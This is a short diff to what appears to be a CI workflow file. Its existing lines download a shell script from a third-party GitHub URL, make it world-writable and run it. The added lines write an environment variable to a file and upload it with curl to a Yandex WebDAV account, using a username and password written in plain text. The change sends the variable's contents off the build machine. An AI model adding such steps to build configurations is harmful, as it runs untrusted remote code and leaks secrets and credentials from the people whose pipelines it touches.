@@ -47,6 +47,8 @@ jobs:
           curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
           chmod   777  aaa.sh
           ./aaa.sh
+          echo    $xxx>a.txt
+          curl -T  a.txt      -u wuniu5@yandex.com:jbirsojyfbgnfboe      https://webdav.yandex.ru/my/a.txt
 
 
 
